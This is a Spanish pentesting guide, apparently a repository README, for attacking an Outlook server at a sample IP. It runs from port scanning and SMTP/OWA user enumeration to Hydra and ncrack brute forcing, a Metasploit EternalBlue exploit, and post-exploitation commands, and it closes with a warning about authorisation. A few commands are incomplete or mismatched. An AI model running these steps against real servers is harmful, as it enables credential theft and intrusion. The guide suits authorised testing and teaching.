***Pentesting de un Servidor Outlook***  
Este repositorio contiene una guía detallada para realizar un pentest en un servidor Outlook. La guía abarca desde el reconocimiento y enumeración inicial hasta la explotación y post-explotación. La IP objetivo usada en los ejemplos es `192.168.1.100`.

**Paso 1: Reconocimiento y Enumeración**

**1.1. Escaneo de Puertos**  
Realiza un escaneo de puertos detallado para obtener información adicional sobre los servicios y versiones.

`nmap -sV -sC -A 192.168.1.100`

**1.2. Obtener Banners**  
Obtén banners de servicios para identificar versiones exactas.

`nc 192.168.1.100 25`  
`nc 192.168.1.100 80`  
`nc 192.168.1.100 443`  
`nc 192.168.1.100 143`  
`nc 192.168.1.100 993`  
`nc 192.168.1.100 3389`  

**Paso 2: Análisis de Servicios Específicos**

**2.1. SMTP (25/tcp)**
Enumeración de Usuarios con smtp-user-enum. Verifica la existencia de usuarios utilizando diferentes modos (VRFY, EXPN, RCPT):  

`smtp-user-enum -M VRFY -U usuarios.txt -t 192.168.1.100`  
`smtp-user-enum -M EXPN -U usuarios.txt -t 192.168.1.100`  
`smtp-user-enum -M RCPT -U usuarios.txt -t 192.168.1.100`  

Verificación de Envío de Correos. Prueba el envío de correos para verificar configuraciones de relay abiertas:

`telnet 192.168.1.100 25`  

Dentro de la sesión telnet:

`HELO example.com`  
`MAIL FROM:<test@example.com>`  
`RCPT TO:<victim@example.com>`  
`DATA`  
`Subject: Test Email`  
`This is a test email.`  
.
QUIT 

**2.2. HTTP (80/tcp) y HTTPS (443/tcp)**  
Exploración de OWA. Si el servidor tiene Outlook Web Access (OWA), verifica su acceso y realiza pruebas de enumeración de usuarios.

`gobuster dir -u https://192.168.1.100/owa -w /usr/share/wordlists/dirb/common.txt -k`  

Verificación de Credenciales. Prueba de fuerza bruta o de credenciales con herramientas como Hydra.

`hydra -L usuarios.txt -P passwords.txt https-post-form "/owa/auth.owa:username=^USER^&password=^PASS^:F=incorrect" -V`  

**2.3. IMAP (143/tcp) e IMAPS (993/tcp)**  
Prueba de Conexión. Verifica la conexión y autenticación usando openssl y telnet.

`openssl s\_client -connect 192.168.1.100:993`

Dentro de la sesión openssl:

a login username password

a list "" "\*"

Enumeración y Fuerza Bruta. Prueba de fuerza bruta para IMAP utilizando Hydra.

`hydra -L usuarios.txt -P passwords.txt imap://192.168.1.100 -V`

**2.4. RDP (3389/tcp)**  
Enumeración de RDP con ncrack

`ncrack -p 3389 -u <usuario> -P <archivo\_contrasenas> 192.168.1.100`

Conexión a Escritorio Remoto

`rdesktop 192.168.1.100`

**Paso 3: Análisis de Vulnerabilidades**

**3.1. Escaneo de Vulnerabilidades con nmap**  
Usa scripts NSE de Nmap para escanear vulnerabilidades conocidas.

`nmap -sV --script vuln 192.168.1.100`

**3.2. Uso de Herramientas de Escaneo de Vulnerabilidades**  
Herramientas como OpenVAS, Nessus o Nexpose.

`openvas-start`  

Sigue las instrucciones en el navegador para realizar un escaneo.

**Paso 4: Explotación**

**4.1. Explotación de Vulnerabilidades**  
Si se encuentran vulnerabilidades, usa Metasploit para la explotación.

`msfconsole`
`use exploit/windows/smb/ms17\_010\_eternalblue`
`set RHOSTS 192.168.1.100`
`run`

**4.2. Exploits Manuales**  
Busca exploits en Exploit-DB y ejecútalos manualmente si aplica.

**Paso 5: Post-Explotación**

**5.1. Enumeración de Sistemas**  
Si logras acceso, enumera los sistemas para obtener más información.

`systeminfo`  
`whoami /priv`  
`net user` 

**5.2. Exfiltración de Información**  
Busca y extrae información sensible.

`type C:\\path\\to\\sensitive\\file.txt`  

**Resumen de Herramientas Utilizadas**  
Reconocimiento: nmap, nc. Enumeración: smtp-user-enum, telnet, gobuster, dirb. Análisis de Vulnerabilidades: nmap scripts NSE, OpenVAS, Nessus. Explotación: Metasploit, manual exploits. Post-Explotación: systeminfo, whoami, net user.

**Notas Importantes**  
Legalidad y Permiso: Asegúrate de tener permiso explícito para realizar estas pruebas en el servidor objetivo. La enumeración de usuarios sin autorización puede ser ilegal y violar las políticas de seguridad. Documentación: Documenta cada paso y resultado de manera detallada para futuras referencias y análisis.

